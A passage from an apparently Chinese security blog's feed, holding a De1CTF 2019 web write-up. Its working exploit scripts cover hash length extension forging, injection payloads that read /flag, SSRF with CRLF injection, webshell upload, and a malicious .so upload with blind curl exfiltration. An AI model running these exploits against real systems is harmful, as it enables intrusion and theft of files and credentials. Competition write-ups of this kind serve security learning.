        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;今天要坐5个小时的高铁，在车上顺便打了个比赛，以下是web题解。&lt;/p&gt;
&lt;h2 id=&quot;Game&quot;&gt;&lt;a href=&quot;#Game&quot; cla
      
    
    </summary>
    
      <category term="web" scheme="http://skysec.top/categories/web/"/>
    
    
      <category term="web" scheme="http://skysec.top/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>2019 De1CTF Writeup</title>
    <link href="http://skysec.top/2019/08/03/2019-De1CTF-Writeup/"/>
    <id>http://skysec.top/2019/08/03/2019-De1CTF-Writeup/</id>
    <published>2019-08-03T10:50:10.000Z</published>
    <updated>2019-09-07T01:24:46.564Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>为了去重庆XCTF Final吃火锅，周末就冲了一下De1CTF，以下是本次比赛Web题解。<br><img src="/images/2019-08-05-10-15-37.png" alt=""></p><h2 id="SSRF-Me"><a href="#SSRF-Me" class="headerlink" title="SSRF Me"></a>SSRF Me</h2><p>拿到题目源码如下：<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/env python</span></span><br><span class="line"><span class="comment">#encoding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line">reload(sys)</span><br><span class="line">sys.setdefaultencoding(<span class="string">'latin1'</span>)</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">secert_key = os.urandom(<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Task</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, action, param, sign, ip)</span>:</span></span><br><span class="line">        self.action = action</span><br><span class="line">        self.param = param</span><br><span class="line">        self.sign = sign</span><br><span class="line">        self.sandbox = md5(ip)</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">not</span> os.path.exists(self.sandbox)):          <span class="comment">#SandBox For Remote_Addr</span></span><br><span class="line">            os.mkdir(self.sandbox)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">Exec</span><span class="params">(self)</span>:</span></span><br><span class="line">        result = &#123;&#125;</span><br><span class="line">        result[<span class="string">'code'</span>] = <span class="number">500</span></span><br><span class="line">        <span class="keyword">if</span> (self.checkSign()):</span><br><span class="line">            <span class="keyword">if</span> <span class="string">"scan"</span> <span class="keyword">in</span> self.action:</span><br><span class="line">                tmpfile = open(<span class="string">"./%s/result.txt"</span> % self.sandbox, <span class="string">'w'</span>)</span><br><span class="line">                resp = scan(self.param)</span><br><span class="line">                <span class="keyword">if</span> (resp == <span class="string">"Connection Timeout"</span>):</span><br><span class="line">                    result[<span class="string">'data'</span>] = resp</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="keyword">print</span> resp</span><br><span class="line">                    tmpfile.write(resp)</span><br><span class="line">                    tmpfile.close()</span><br><span class="line">                result[<span class="string">'code'</span>] = <span class="number">200</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">"read"</span> <span class="keyword">in</span> self.action:</span><br><span class="line">                f = open(<span class="string">"./%s/result.txt"</span> % self.sandbox, <span class="string">'r'</span>)</span><br><span class="line">                result[<span class="string">'code'</span>] = <span class="number">200</span></span><br><span class="line">                result[<span class="string">'data'</span>] = f.read()</span><br><span class="line">            <span class="keyword">if</span> result[<span class="string">'code'</span>] == <span class="number">500</span>:</span><br><span class="line">                result[<span class="string">'data'</span>] = <span class="string">"Action Error"</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            result[<span class="string">'code'</span>] = <span class="number">500</span></span><br><span class="line">            result[<span class="string">'msg'</span>] = <span class="string">"Sign Error"</span></span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">checkSign</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> (getSign(self.action, self.param) == self.sign):</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">True</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line"><span class="comment">#generate Sign For Action Scan.</span></span><br><span class="line"><span class="meta">@app.route("/geneSign", methods=['GET', 'POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">geneSign</span><span class="params">()</span>:</span></span><br><span class="line">    param = urllib.unquote(request.args.get(<span class="string">"param"</span>, <span class="string">""</span>))</span><br><span class="line">    action = <span class="string">"scan"</span></span><br><span class="line">    <span class="keyword">return</span> getSign(action, param)</span><br><span class="line"><span class="meta">@app.route('/De1ta',methods=['GET','POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">challenge</span><span class="params">()</span>:</span></span><br><span class="line">    action = urllib.unquote(request.cookies.get(<span class="string">"action"</span>))</span><br><span class="line">    param = urllib.unquote(request.args.get(<span class="string">"param"</span>, <span class="string">""</span>))</span><br><span class="line">    sign = urllib.unquote(request.cookies.get(<span class="string">"sign"</span>))</span><br><span class="line">    ip = request.remote_addr</span><br><span class="line">    <span class="keyword">if</span>(waf(param)):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"No Hacker!!!!"</span></span><br><span class="line">    task = Task(action, param, sign, ip)</span><br><span class="line">    <span class="keyword">return</span> json.dumps(task.Exec())</span><br><span class="line"><span class="meta">@app.route('/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> open(<span class="string">"code.txt"</span>,<span class="string">"r"</span>).read()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">scan</span><span class="params">(param)</span>:</span></span><br><span class="line">    socket.setdefaulttimeout(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">return</span> urllib.urlopen(param).read()[:<span class="number">50</span>]</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"Connection Timeout"</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getSign</span><span class="params">(action, param)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(secert_key + param + action).hexdigest()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">md5</span><span class="params">(content)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(content).hexdigest()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">waf</span><span class="params">(param)</span>:</span></span><br><span class="line">    check=param.strip().lower()</span><br><span class="line">    <span class="keyword">if</span> check.startswith(<span class="string">"gopher"</span>) <span class="keyword">or</span> check.startswith(<span class="string">"file"</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    app.debug = <span class="keyword">False</span></span><br><span class="line">    app.run(host=<span class="string">'0.0.0.0'</span>,port=<span class="number">80</span>)</span><br></pre></td></tr></table></figure></p><p>观察一下，发现就是个比较裸的SSRF:<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">scan</span><span class="params">(param)</span>:</span></span><br><span class="line">    socket.setdefaulttimeout(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">return</span> urllib.urlopen(param).read()[:<span class="number">50</span>]</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"Connection Timeout"</span></span><br></pre></td></tr></table></figure></p><p>然后waf如下：<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">waf</span><span class="params">(param)</span>:</span></span><br><span class="line">    check=param.strip().lower()</span><br><span class="line">    <span class="keyword">if</span> check.startswith(<span class="string">"gopher"</span>) <span class="keyword">or</span> check.startswith(<span class="string">"file"</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">False</span></span><br></pre></td></tr></table></figure></p><p>同时结合题目告诉我们flag位置：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hint for [SSRF Me]: flag is in ./flag.txt</span><br></pre></td></tr></table></figure></p><p>那么显然只要能任意文件读取，bypass file过滤即可，这里容易想到可以使用local_file:<br><img src="/images/2019-08-04-10-15-34.png" alt=""><br>但是我们发现想要利用scan，要先bypass签名校验：<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">checkSign</span><span class="params">(self)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> (getSign(self.action, self.param) == self.sign):</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">False</span></span><br></pre></td></tr></table></figure></p><p>我们跟进getSign():<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getSign</span><span class="params">(action, param)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(secert_key + param + action).hexdigest()</span><br></pre></td></tr></table></figure></p><p>而salt我们知道:<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">secert_key = os.urandom(<span class="number">16</span>)</span><br></pre></td></tr></table></figure></p><p>所以这明显是一个已知salt长度的hash长度拓展攻击的问题，那么很容易写出脚本如下：<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashpumpy</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"></span><br><span class="line">url = <span class="string">'local_file:flag.txt'</span></span><br><span class="line">r = requests.get(<span class="string">'http://139.180.128.86/geneSign?param='</span>+url)</span><br><span class="line">old_sign = r.content</span><br><span class="line">new_sign = hashpumpy.hashpump(old_sign, url + <span class="string">'scan'</span>, <span class="string">'read'</span>, <span class="number">16</span>)</span><br><span class="line">cookies=&#123;</span><br><span class="line">    <span class="string">'sign'</span>: new_sign[<span class="number">0</span>],</span><br><span class="line">    <span class="string">'action'</span>: urllib.quote(new_sign[<span class="number">1</span>][<span class="number">19</span>:])</span><br><span class="line">&#125;</span><br><span class="line">r = requests.get(<span class="string">'http://139.180.128.86/De1ta?param='</span>+url, cookies=cookies)</span><br><span class="line"><span class="keyword">print</span> r.content</span><br></pre></td></tr></table></figure></p><p><img src="/images/2019-08-04-10-23-38.png" alt=""></p><h2 id="9calc"><a href="#9calc" class="headerlink" title="9calc"></a>9calc</h2><p>第3次calcalcalc了，不想再分析了，脚本如下：<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="comment"># flag1 js</span></span><br><span class="line"><span class="comment"># chr(j),i,chr(j)</span></span><br><span class="line">data1 = <span class="string">r'''&#123;"expression":&#123;"value":"1//1 and '%s' + '\\x0f\\x00\\x00\\x00\\x02ret\\x00\\x01\\x00\\x00\\x00' or '\\\n&amp;&amp;'#' &amp;&amp; ('1e1' != '10e0' &amp;&amp; require('fs').readFileSync('/flag').toString()[%s] + '\\x0f\\x00\\x00\\x00\\x02ret\\x00\\x01\\x00\\x00\\x00') || eval('echo \"\\x1d\\x00\\x00\\x00\\x02ret\\x00\\x0f\\x00\\x00\\x00\".\"%s\";')\n","_bsontype":"Symbol"&#125;,"isVip":true&#125;'''</span></span><br><span class="line"><span class="comment"># flag2 python</span></span><br><span class="line"><span class="comment"># i,chr(j),chr(j)</span></span><br><span class="line">data2 = <span class="string">r'''&#123;"expression":&#123;"value":"1//1 and open('/flag').read()[%s] + '\\x0f\\x00\\x00\\x00\\x02ret\\x00\\x01\\x00\\x00\\x00' or '\\\n&amp;&amp;'#' &amp;&amp; ('1e1' != '10e0' &amp;&amp; '%s' + '\\x0f\\x00\\x00\\x00\\x02ret\\x00\\x01\\x00\\x00\\x00') || eval('echo \"\\x1d\\x00\\x00\\x00\\x02ret\\x00\\x0f\\x00\\x00\\x00\".\"%s\";')\n","_bsontype":"Symbol"&#125;,"isVip":true&#125;'''</span></span><br><span class="line"><span class="comment"># flag3 php</span></span><br><span class="line"><span class="comment"># chr(j),chr(j),i</span></span><br><span class="line">data3 = <span class="string">r'''&#123;"expression":&#123;"value":"1//1 and '%s' + '\\x0f\\x00\\x00\\x00\\x02ret\\x00\\x01\\x00\\x00\\x00' or '\\\n&amp;&amp;'#' &amp;&amp; ('1e1' != '10e0' &amp;&amp; '%s' + '\\x0f\\x00\\x00\\x00\\x02ret\\x00\\x01\\x00\\x00\\x00') || eval('echo \"\\x1d\\x00\\x00\\x00\\x02ret\\x00\\x0f\\x00\\x00\\x00\".file_get_contents(\"/flag\")[%s];')\n","_bsontype":"Symbol"&#125;,"isVip":true&#125;'''</span></span><br><span class="line"></span><br><span class="line">header = &#123;</span><br><span class="line">    <span class="string">"Content-Type"</span>:<span class="string">"application/json"</span></span><br><span class="line">&#125;</span><br><span class="line">url = <span class="string">"http://45.77.242.16/calculate"</span></span><br><span class="line">res = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">20</span>):</span><br><span class="line"><span class="keyword">print</span> i</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">32</span>,<span class="number">127</span>):</span><br><span class="line"><span class="comment"># now_data = data1%(chr(j),i,chr(j))</span></span><br><span class="line"><span class="comment"># now_data = data2%(i,chr(j),chr(j))</span></span><br><span class="line">now_data = data3%(chr(j),chr(j),i)</span><br><span class="line">r = requests.post(url,data=now_data,headers=header)</span><br><span class="line"><span class="keyword">if</span> <span class="string">'ret'</span> <span class="keyword">in</span> r.content:</span><br><span class="line">res+=chr(j)</span><br><span class="line"><span class="keyword">print</span> res</span><br><span class="line"><span class="keyword">break</span></span><br></pre></td></tr></table></figure></p><p><img src="/images/2019-08-04-10-31-49.png" alt=""><br><img src="/images/2019-08-04-10-31-27.png" alt=""><br><img src="/images/2019-08-04-10-31-33.png" alt=""><br>可以得到flag:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">de1ctf&#123;i_hate_bunkatsu_soho&#125;</span><br></pre></td></tr></table></figure></p><h2 id="ShellShellShell"><a href="#ShellShellShell" class="headerlink" title="ShellShellShell"></a>ShellShellShell</h2><p>这题有点无语，第一层是N1CTF的题，参考如下链接：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/rkmylo/ctf-write-ups/tree/master/2018-n1ctf/web/easy-php-540</span><br></pre></td></tr></table></figure></p><p>这题再简单说一下思路吧：<br>1.注入得到管理员密码<br>2.soapclient发起ssrf<br>3.进行CRLF头注入登录<br>4.拿到admin session<br>我们直接用上述链接中的脚本：<br>首先生成验证码映射关系：<br><img src="/images/2019-08-04-10-44-14.png" alt=""><br>然后是注入密码：<br><img src="/images/2019-08-04-10-44-19.png" alt=""><br><img src="/images/2019-08-03-18-51-05.png" alt=""><br>最后是SSRF拿到admin session：<br><img src="/images/2019-08-04-10-44-25.png" alt=""><br><img src="/images/2019-08-04-10-45-10.png" alt=""><br>然后是一个裸上传：<br><img src="/images/2019-08-04-10-45-28.png" alt=""><br>同时提醒我们flag在内网，这里的上传没任何过滤，随便传个小马即可RCE，然后上传代理，扫描内网，得到题目ip:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Nmap scan report for 172.18.0.1</span><br><span class="line">Host is up (0.00031s latency).</span><br><span class="line">Nmap scan report for dockerdir_getshell_1.dockerdir_default (172.18.0.2)</span><br><span class="line">Host is up (0.00022s latency).</span><br><span class="line">Nmap scan report for 29e2e46b7ac1 (172.18.0.3)</span><br><span class="line">Host is up (0.00015s latency).</span><br><span class="line">Nmap done: 256 IP addresses (3 hosts up) scanned in 1.91 seconds</span><br></pre></td></tr></table></figure></p><p>访问172.18.0.2，得到源码如下：<br><img src="/images/2019-08-04-10-46-51.png" alt=""><br>然后发现似曾相识= =：<br><img src="/images/2019-08-04-10-47-09.png" alt=""><br>那么就用这篇Blog的方式可以轻松解决:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://skysec.top/2018/11/04/2018%E4%B8%8A%E6%B5%B7%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B-web/#web3</span><br></pre></td></tr></table></figure></p><h2 id="cloudmusic-rev"><a href="#cloudmusic-rev" class="headerlink" title="cloudmusic_rev"></a>cloudmusic_rev</h2><p>看到是2.0版本，本能搜了一下，发现是2019国赛final的题目，题解如下:<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/impakho/ciscn2019_final_web1</span><br></pre></td></tr></table></figure></p><p>按照题解思路，可以迅速拿到/lib/parser.so文件：<br><img src="/images/2019-08-04-10-49-12.png" alt=""><br>尝试读取.php的时候，发现有过滤：<br><img src="/images/2019-08-04-12-03-16.png" alt=""><br>但可以用%2e url编码进行绕过：<br><img src="/images/2019-08-04-12-03-29.png" alt=""><br>那么读取关键文件进行diff：<br>upload.php<br><img src="/images/2019-08-04-12-01-19.png" alt=""><br>利用原题解中的方式进行password leak，发现代码有改变，简单分析发现是off by null，构造：<br><img src="/images/2019-08-04-15-29-46.png" alt=""><br>即可leak password:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">admin</span><br><span class="line">22Z2teQgmmLQJLjD</span><br></pre></td></tr></table></figure></p><p>接着diff firmware.php：<br><img src="/images/2019-08-04-12-02-22.png" alt=""><br><img src="/images/2019-08-04-12-02-25.png" alt=""><br>发现在firmware中，文件名称做了改动，拼接字符串变成了remote_addr，并且在后面回显版本号的时候，去掉了回显。<br>也就是说，这道题只能盲打了:<br><img src="/images/2019-08-04-12-07-23.png" alt=""><br>不会再如上图打印执行命令结果了。<br>按照原题的思路，我们使用如下命令去getflag:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/bin/tac /flag</span><br></pre></td></tr></table></figure></p><p>但是考虑到不能回显，于是我们构造curl带出，编写相应的文件：<br><img src="/images/2019-08-04-15-24-47.png" alt=""><br>预测文件path:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$seed = strtotime(<span class="string">"Sun, 04 Aug 2019 07:16:55 GMT"</span>);</span><br><span class="line"><span class="keyword">for</span>($i=<span class="number">-50</span>;$i&lt;<span class="number">50</span>;$i++)</span><br><span class="line">&#123;</span><br><span class="line">mt_srand($seed+$i);</span><br><span class="line"><span class="keyword">echo</span> md5(mt_rand().<span class="string">"202.120.234.54"</span>).<span class="string">"','"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>fuzz目录与上传:<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://139.180.144.87:9090/hotload.php?page=firmware'</span></span><br><span class="line">cookies = &#123;</span><br><span class="line"><span class="string">'PHPSESSID'</span>:<span class="string">'0khipdkurln3q6a4tli9t7v38o'</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">upload</span><span class="params">()</span>:</span></span><br><span class="line">f = open(<span class="string">'exp.so'</span>,<span class="string">'rb'</span>)</span><br><span class="line">firmware = f.read()</span><br><span class="line">files = &#123;<span class="string">'file_data'</span>: firmware&#125;</span><br><span class="line">data = &#123;<span class="string">'file_id'</span>: <span class="string">'0'</span>&#125;</span><br><span class="line">r = requests.post(url=url, data=data, files=files,cookies=cookies)</span><br><span class="line"><span class="keyword">if</span> <span class="string">'"status":1'</span> <span class="keyword">in</span> r.content:</span><br><span class="line"><span class="keyword">return</span> r.headers</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fuzz_path</span><span class="params">(path)</span>:</span></span><br><span class="line">data = &#123;</span><br><span class="line"><span class="string">'path'</span>:path</span><br><span class="line">&#125;</span><br><span class="line">r = requests.post(url=url, data=data, cookies=cookies)</span><br><span class="line"><span class="keyword">print</span> r.content</span><br><span class="line"><span class="keyword">if</span> <span class="string">'loading firmware'</span> <span class="keyword">in</span> r.content:</span><br><span class="line"><span class="keyword">print</span> path</span><br><span class="line"></span><br><span class="line">r = upload()</span><br><span class="line"><span class="keyword">print</span> r</span><br><span class="line">seed_list = [<span class="string">'8674e9e3b1f875549154d6e67275f996'</span>,<span class="string">'df6dfa987283ffb730857170b5d43128'</span>,<span class="string">'541c571155c89cd4e183b4b17cb15f58'</span>,<span class="string">'6ec428a2d4228ef2378d38e0902cb8ab'</span>,<span class="string">'e1badd072582c8e7aae04c3ee7e77dae'</span>,<span class="string">'539276560804530afc08eb2499e0b865'</span>,<span class="string">'6a2bd9ce496568d210e0a9c0d25b4dfb'</span>,<span class="string">'c18761d54636950afddf19841d7d89b0'</span>,<span class="string">'5e40c2d36b72330faec9ae8cc8728365'</span>,<span class="string">'e5fdd8f158a6953e088abc2915ab211a'</span>,<span class="string">'1d1952993a48af0128eaf6da5f32676b'</span>,<span class="string">'9a189fabc6147d2f894468a657edf5b9'</span>,<span class="string">'d255c575bf2b8d2af0f44f520a09369b'</span>,<span class="string">'0a056867908b10edff7fc312d4798622'</span>,<span class="string">'e537949893013ab3163806171bae5735'</span>,<span class="string">'13f95e9313bfe44e8f80fa42980c1bc3'</span>,<span class="string">'8aad66d7c84981b96d31760027c4ccd1'</span>,<span class="string">'b47097b9846a8c83499d4342de33db31'</span>,<span class="string">'82f720249f5b6c1c9faffc7a5ec93ebc'</span>,<span class="string">'611c45a5ff023134e3034d1fd6de2248'</span>,<span class="string">'04491f0cc963af38fac5752070608a34'</span>,<span class="string">'8de0681a471bfb5868a843fa489864a3'</span>,<span class="string">'83ffca4f8f927a2d4615e677b2b4b44c'</span>,<span class="string">'55d9cbcf35c57ffb7dbc10a91490fe59'</span>,<span class="string">'f38692e68e3628541adb02f4688804d1'</span>,<span class="string">'19baad3d00d52e65f80a8593b4ba255d'</span>,<span class="string">'1e4355a0829c2c740fa71ec49c8fa02a'</span>,<span class="string">'8eb1d6fdc6bf3c774cddc76ab3868fb1'</span>,<span class="string">'0e6d3172d8be061d7a4abf3e167574be'</span>,<span class="string">'c7dc7167891bfa24d8e68fae459b643e'</span>,<span class="string">'7d272df00c853691d3fcac63df650984'</span>,<span class="string">'dcc78a64935d765ccda0813173a2cd16'</span>,<span class="string">'f3ec93c54a6ca1719a467fade49ee233'</span>,<span class="string">'f4974c648bead1faaca6f8fe38dcd3f2'</span>,<span class="string">'519886b669fef5706ff30dd95ca48997'</span>,<span class="string">'3db6f01c8d159dba6356ce0c2e337f30'</span>,<span class="string">'502d5dc2723468c378d721bb1e868191'</span>,<span class="string">'fa1df40a8ac9d237955d3e4c22cb4b45'</span>,<span class="string">'04e0c4e04a675b45fad3ffaddfd9040c'</span>,<span class="string">'efcbd1b16518f2bf91b958af269c030b'</span>,<span class="string">'9409d27de31a6dd2550f8b9e1ae3aba9'</span>,<span class="string">'6743ff069733273efa1cd624e431983e'</span>,<span class="string">'92aa4fe93a448a1677d9782e5f81e62d'</span>,<span class="string">'d309f564f9e116b1a69555d0f9fef3a8'</span>,<span class="string">'1a16f4e59332688eea6e28677d5ac141'</span>,<span class="string">'700cb511e95356b8b2877b79d01ad054'</span>,<span 